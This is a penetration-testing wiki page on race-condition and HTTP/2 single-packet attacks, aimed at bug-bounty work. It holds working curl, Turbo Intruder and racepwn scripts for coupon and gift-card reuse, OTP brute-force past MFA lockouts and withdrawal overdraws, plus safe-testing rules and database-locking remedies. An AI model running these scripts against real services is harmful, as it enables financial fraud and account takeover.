---
type: wiki
category: attack
tool: burp,turbo-intruder
status: active
last-updated: 2026-04-21
---

# Race Condition / Single-Packet Attack

> **Use case:** A major PortSwigger research focus in recent years. Coupon redeem / 2FA bypass / OTP brute-force / IDOR differential and other high-payout vulnerabilities.
> The 2023 HTTP/2 single-packet attack technique reduced network jitter to under 1ms, bringing back scenarios that were previously "impossible to race."

## 0. Principle (TOCTOU)

```
Thread A: read balance (100)
Thread B: read balance (100)
Thread A: balance -= 50 (50)
Thread A: write balance (50)
Thread B: balance -= 50 (50)   ← thinks balance is still 100
Thread B: write balance (50)   ← should actually be 0

Result: user spent 100 but only 50 was deducted
```

Scenarios where this applies:
- Coupons / vouchers that should only be usable once
- Withdrawals / transfers
- Limited-quantity flash sales
- Referral codes
- 2FA / OTP verification
- Like / Follow counts
- Friend / invite acceptance

## 1. Traditional race (curl xargs parallel)

```bash
# 40 parallel requests
seq 1 40 | xargs -P 40 -I{} curl -sk -X POST \
  "https://target.com/api/coupon/redeem" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code":"SAVE10"}'

# Check how many succeeded (normally should only be 1)
```

Problem: each request has its own independent TCP handshake, and network jitter can be 50-200ms, which can wipe out the race window.

## 2. Single-Packet Attack (2023 breakthrough)

Burp / Turbo Intruder can stuff N HTTP/2 requests' frames into a single TCP packet, so the server receives all of them at the exact same instant → jitter eliminated.

### Burp Repeater Group

```
1. Right-click request → "Send to Repeater"
2. Duplicate N times, add to the same Repeater Group (top-right + → "Create tab group")
3. Change the dropdown to "Send group in parallel (single-packet attack)"
4. Send
```

This is the **simplest method** for testing races in 2026.

### Turbo Intruder (scripted)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    req = '''POST /api/coupon/redeem HTTP/2
Host: target.com
Authorization: Bearer TOKEN
Content-Type: application/json
Content-Length: 18

{"code":"SAVE10"}'''

    for i in range(30):
        engine.queue(req)

    engine.start(timeout=5)

def handleResponse(req, interesting):
    if 'success' in req.response:
        table.add(req)
```

## 3. Classic Patterns

### 3.1 Coupon redeem race

```
POST /api/coupon/redeem  (30 parallel)
→ the server typically checks "coupon.used == false" → sets used=true → saves
→ during the race, all 30 requests see used=false → all 30 get the discount
```

### 3.2 MFA brute-force bypass

MFA usually restricts "lock after 5 wrong attempts." But the lock counter also has a race window:

```
Send 10000 OTP attempts (single-packet)
→ The server only increments failed_count a few times
→ Among the 10000 attempts, a hit gets through
```

### 3.3 Withdraw / transfer overdraw

```
balance: $100
10 concurrent $50 withdraw requests
→ 5-10 succeed → $250-500 withdrawn
```

### 3.4 Like / vote inflation

```
POST /api/post/123/like (100 parallel, same user)
→ succeeds multiple times
```

### 3.5 Gift card redemption

```
POST /api/giftcard/redeem (30 parallel, same code)
→ multiple accounts each receive the balance
```

### 3.6 Friend request / invite

```
POST /api/invite/accept  (20 parallel, same invite link)
→ a single invite gets accepted by multiple people
```

### 3.7 Signup with the same email multiple times

```
POST /signup (10 parallel, email=x@x.com)
→ the email-uniqueness check gets bypassed, multiple accounts get created
```

### 3.8 Password reset token reuse

```
POST /reset-password (20 parallel, same token)
→ the old password gets reset multiple times, or the same token gets reused
```

## 4. Advanced: Delay-based race

Some races require the server to be stalled first for a period; Burp's "Gate" feature can hold requests on the TCP socket and release them all simultaneously once everything is queued.

### Burp Turbo Intruder gate pattern

```python
def queueRequests(target):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        engine=Engine.THREADED
    )

    req = '...'
    for i in range(30):
        engine.queue(req, gate='race1')

    engine.openGate('race1')   # release simultaneously
```

## 5. Detection: how to tell if a race exists

### 5.1 Response status diff

```
30 parallel → if all 200 → race may exist
30 parallel → 29x 429/409 + 1x 200 → rate limit is OK
```

### 5.2 State diff

Check the data after sending:
```
before: balance=100, coupon_used=false
after:  balance=0 (or negative), coupon has multiple redemption records
```

### 5.3 Timing

Check the response times after sending:
- No race: requests processed sequentially (150ms, 300ms, 450ms, ...)
- Race present: nearly simultaneous (150ms, 152ms, 155ms, ...)

## 6. Tool chain

| Tool | Purpose | Difficulty |
|------|------|------|
| **Burp Repeater group** (single-packet) | manual 20-30 req race | ⭐ beginner |
| **Turbo Intruder** | scriptable, supports high volume + gate | ⭐⭐ medium |
| **racepwn** | Go CLI, no Burp needed | ⭐⭐ |
| **curl xargs** | most basic, high jitter | ⭐ |
| **nuclei** (limited) | not recommended for race | — |

### Installing Turbo Intruder

```
Burp Extender → BApp Store → "Turbo Intruder" → Install
Right-click request → "Send to Turbo Intruder"
```

### racepwn

```bash
# https://github.com/racepwn/racepwn
go install github.com/racepwn/racepwn@latest

cat > race.json << EOF
{
  "race": {
    "type": "http",
    "count": 30
  },
  "http": {
    "ssl": true,
    "port": 443,
    "host": "target.com",
    "request": "POST /api/coupon/redeem HTTP/1.1\r\nHost: target.com\r\n\r\n{\"code\":\"X\"}"
  }
}
EOF

racepwn -c race.json
```

## 7. Full real-world PoC

### Case: Gift card code reuse

Assume the target is `POST /api/giftcard/redeem`, which should allow one code to be redeemed only once.

### Step 1: Redeem normally once
```
POST /api/giftcard/redeem
{"code":"GC-ABCD-1234"}
→ 200 {"balance": 50.00, "added": 50.00}
```

### Step 2: Redeem again (confirm it can't be repeated)
```
POST /api/giftcard/redeem
{"code":"GC-ABCD-1234"}
→ 400 {"error":"already redeemed"}
```

### Step 3: Reset balance (get a fresh test code, assuming that's available)

### Step 4: Race (30 parallel, Burp group)
```
Result:
- 12 × 200 OK ({"added": 50})
- 18 × 400 already redeemed

balance actually += 600 (12 × 50), should have only been +50
```

### Step 5: Report

## 8. Report template

```markdown
## Vulnerability Summary
https://target.com/api/giftcard/redeem does not enforce row-lock / database
transaction atomicity for gift card redemption; a 30-concurrent single-packet
attack redeems the same gift card multiple times, amplifying a $50 card value
to $600.

## Reproduction Steps

### Step 1: Obtain a test gift card code
[purchase method or provided by admin]

### Step 2: Redeem normally once
curl -X POST https://target.com/api/giftcard/redeem \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code":"GC-TEST"}'
→ balance +50

### Step 3: Second normal redemption (should be rejected)
→ 400 already_redeemed

### Step 4: Reset + race
- Burp Repeater Group × 30 copies
- Send in parallel (single-packet attack)

### Step 5: Result
- 12 × HTTP 200 (already redeemed)
- Wallet balance +600 instead of +50

## Impact
- Gift card code monetary multiplication (12x in test)
- Any $50 card can be amplified to $600+
- Estimated $550 loss to the company per test run

## Severity
P2 / High (P1 if it's a monetary asset)
```

## 9. Safe testing rules

1. ✅ Use a test account + test coupon / test amount first
2. ❌ Don't affect other users' balance in production
3. ❌ Don't run large withdrawal tests (even on your own account, this carries compliance risk)
4. ✅ Use the smallest possible amount in the PoC ($1, $5)
5. ✅ Include cleanup suggestions (refunding any race profit)

## 10. Defense angle (for writing remediation suggestions)

```
1. DB-level unique constraint (status + code)
2. SELECT ... FOR UPDATE (row lock)
3. Optimistic locking (version field)
4. Redis SETNX distributed lock
5. Rate limiting per-endpoint + per-user
6. Idempotency key design
```

## Related files

- [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md) § 4 Alias overload — also a form of race condition
- PortSwigger Race Conditions Lab: https://portswigger.net/web-security/race-conditions
- Turbo Intruder docs: https://github.com/PortSwigger/turbo-intruder
- racepwn: https://github.com/racepwn/racepwn
- James Kettle "Smashing the state machine": https://portswigger.net/research/smashing-the-state-machine
